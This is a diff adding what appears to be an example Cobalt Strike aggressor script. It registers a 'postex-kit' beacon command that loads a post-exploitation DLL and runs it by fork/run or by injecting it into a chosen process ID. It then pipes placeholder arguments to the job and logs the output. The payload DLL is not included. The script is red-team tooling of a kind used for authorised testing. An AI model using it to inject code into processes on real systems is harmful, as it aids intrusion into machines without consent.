@@ -1,0 +1,121 @@
+debug(7);
+
+# declare the global variables
+global('%callbacks');
+
+# declare a hash map to contain the callback closures
+# beacon id => callback fn
+%callbacks = %();
+
+# --------------------
+# Retrieve the content of the user provided file.
+#
+# @param path - the path to the file.
+# return = a byte array containing the file content
+# --------------------
+sub get_file_content {
+    local('$handle $path $data');
+    $path = $1;
+    $handle = openf($path);
+    $data = readb($handle, -1);
+    closef($handle);
+    return $data;
+}
+
+# --------------------
+# Define the postex-kit command
+# 
+# @param beacon_id - the id of the current beacon
+# @param arch - the architecture of the postex job
+# @param pid - the pid of the target process
+# --------------------
+alias postex-kit {
+    local('$arch $argument_string $beacon_id $callback $postex_dll_path $postex_dll $packed_arguments $pid $pipe_arguments');
+        $beacon_id = $1;
+        $arch = $2;
+        $pid = $3;
+        
+        # find the correct path to the postex DLL
+        if($arch eq "x64") {
+            $postex_dll_path = getFileProper(script_resource("."), "x64", "Release", "postex.dll");
+        } else if ($arch eq "x86") {
+            $postex_dll_path = getFileProper(script_resource("."), "Release", "postex.dll");
+        } else{
+            berror($1, "Invalid architecture");
+            return;
+        }
+
+        # check whether to fork/run or inject
+        if($pid eq "-1") {
+            $pid = $null;
+            btask($1, "Using fork/run to execute postex job");
+        } else {
+            btask($1, "Injecting postex job into $pid");
+        }
+
+        # check the postex dll exists
+        if (!-isFile $postex_dll_path) {
+            berror($1, "Cannot find $postex_dll_path");
+            return;
+        }
+
+        # get the postex DLL content
+        $postex_dll = get_file_content($postex_dll_path);
+        if ($postex_dll is $null) {
+            berror($1, "Failed to retrieve DLL content");
+            return;
+        }
+
+        # pack static arguments
+        $argument_string = "example static argument string";
+        $packed_arguments = bof_pack($beacon_id, "iz", 4444, $argument_string);
+
+        # define a pipe argument string
+        $pipe_arguments = "example pipe argument string";
+
+        # define custom callback function
+        $callback = lambda({
+            local('$bid $data $result %info $type');
+            this('$jid');
+            # get all arguments passed to lambda
+            ($bid, $result, %info) = @_;
+            # check the status/type of the job
+            $type = %info["type"];
+            # if the job is registered, send data via the pipe
+            if ($type eq 'job_registered') {
+                $jid = %info['jid'];
+                # append a new line/carriage return
+                $data = $pipe_arguments . "\r\n";
+                # send the pipe argument string to the DLL
+                bjob_send_data($bid, $jid, $data);    
+            }
+            # if the job is complete, null the job id
+            else if ($type eq 'job_completed') {
+                $jid = $null;
+            }
+            # print output to the console
+            else if ($type eq 'output') {
+                bjoblog($1, $jid, "Received output:\n" . $result);
+            } 
+            else if ($type eq 'error') {
+                bjoberror($1, $jid, "Received error:\n" . $result);
+            }
+        }, $pipe_arguments => $pipe_arguments);
+        
+        # run the postex task...
+        beacon_execute_postex_job($beacon_id, $pid, $postex_dll, $packed_arguments, $callback);
+        
+        # example: run the postex task (without the callback) 
+        #beacon_execute_postex_job($beacon_id, $pid, $postex_dll, $packed_arguments, $null);
+
+        %callbacks[$beacon_id] = $callback;
+}
+
+# --------------------
+# Register the postex-kit command
+# --------------------
+beacon_command_register(
+"postex-kit", 
+"An example command to demonstrate the postex kit.",
+"Fork/Run: postex-kit [arch] -1\n" . 
+"Inject:   postex-kit [arch] [pid]")
